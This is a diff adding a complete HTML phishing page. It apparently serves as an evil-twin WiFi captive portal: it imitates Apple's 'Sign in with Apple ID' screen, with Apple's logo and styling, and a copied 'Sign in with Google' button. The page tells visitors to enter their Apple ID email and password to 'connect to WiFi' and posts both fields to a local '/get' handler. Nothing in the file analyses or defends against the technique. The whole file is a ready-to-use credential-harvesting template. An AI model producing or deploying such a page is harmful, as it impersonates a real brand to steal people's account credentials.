@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
+    <title>Sign in with Apple ID</title>
+    <style>
+      body {
+        font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Display', 'SF Pro Text', 'Helvetica Neue', Helvetica, Arial, sans-serif;
+        background-color: #f5f5f7;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        min-height: 100vh;
+        margin: 0;
+      }
+      .login-container {
+        width: 380px;
+        text-align: center;
+        padding: 20px;
+      }
+      #logo {
+        margin-bottom: 16px;
+      }
+      .g-h1 {
+        font-size: 28px;
+        font-weight: 600;
+        color: #1d1d1f;
+        margin-bottom: 8px;
+      }
+      .g-h2 {
+        font-size: 17px;
+        color: #1d1d1f;
+        margin-bottom: 28px;
+        font-weight: 400;
+      }
+      .g-input {
+        width: 100%;
+        padding: 16px;
+        border: 1px solid #d2d2d7;
+        border-radius: 12px;
+        font-size: 17px;
+        margin-bottom: 16px;
+        box-sizing: border-box;
+        outline: none;
+        background: #fff;
+        color: #1d1d1f;
+      }
+      .g-input:focus {
+        border-color: #0071e3;
+        box-shadow: 0 0 0 4px rgba(0,113,227,0.15);
+      }
+      .gbtn-primary {
+        width: 100%;
+        padding: 16px;
+        background-color: #0071e3;
+        color: #fff;
+        border: none;
+        border-radius: 12px;
+        font-size: 17px;
+        font-weight: 400;
+        cursor: pointer;
+        margin-top: 8px;
+      }
+      .gbtn-primary:hover {
+        background-color: #0077ed;
+      }
+      .forgot {
+        display: block;
+        margin-top: 16px;
+        color: #0071e3;
+        font-size: 14px;
+        text-decoration: none;
+      }
+      .forgot:hover {
+        text-decoration: underline;
+      }
+      .divider {
+        display: flex;
+        align-items: center;
+        margin: 24px 0;
+        color: #86868b;
+        font-size: 12px;
+      }
+      .divider::before, .divider::after {
+        content: '';
+        flex: 1;
+        border-bottom: 1px solid #d2d2d7;
+      }
+      .divider span {
+        padding: 0 12px;
+      }
+      .social-btn {
+        width: 100%;
+        padding: 14px;
+        background: #fff;
+        border: 1px solid #d2d2d7;
+        border-radius: 12px;
+        font-size: 17px;
+        color: #1d1d1f;
+        cursor: pointer;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 10px;
+        margin-bottom: 12px;
+      }
+      .social-btn:hover {
+        background: #f5f5f7;
+      }
+      .footer {
+        margin-top: 20px;
+        font-size: 12px;
+        color: #86868b;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="login-container">
+      <svg id="logo" viewBox="0 0 17 48" width="40" height="46">
+        <path fill="#1d1d1f" d="M15.5 22.3c0-4.4 3.6-6.6 3.8-6.7-2.1-3-5.3-3.4-6.4-3.5-2.7-.3-5.3 1.6-6.7 1.6s-3.6-1.6-5.8-1.5c-3 .1-5.7 1.7-7.2 4.4-3 5.5-.8 13.7 2.2 18.2 1.4 2.2 3.2 4.6 5.5 4.5 2.2-.1 3-1.4 5.6-1.4s3.3 1.4 5.6 1.4c2.3 0 3.8-2.1 5.2-4.4 1.6-2.5 2.3-4.9 2.3-5 0-.1-4.4-1.7-4.4-6.5zM11.3 9.2c1.2-1.4 2-3.4 1.8-5.4-1.7.1-3.8 1.1-5 2.5-1.1 1.3-2.1 3.3-1.8 5.3 1.9.1 3.8-1 5-2.4z" transform="translate(4,0)"/>
+      </svg>
+      <h1 class="g-h1">Sign in with Apple ID</h1>
+      <p class="g-h2">Use your Apple ID to connect to WiFi</p>
+      <form action="/get" method="POST">
+        <input class="g-input" type="email" name="email" placeholder="Email or Phone Number" required>
+        <input class="g-input" type="password" name="password" placeholder="Password" required>
+        <button type="submit" class="gbtn-primary">Sign In</button>
+      </form>
+      <a href="#" class="forgot">Forgot Apple ID or password?</a>
+      <div class="divider"><span>or</span></div>
+      <button class="social-btn">
+        <svg width="20" height="20" viewBox="0 0 48 48"><path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/><path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/><path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/><path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/></svg>
+        Sign in with Google
+      </button>
+      <p class="footer">Don't have an Apple ID? <a href="#" style="color:#0071e3;text-decoration:none">Create yours now</a>.</p>
+    </div>
+  </body>
+</html>
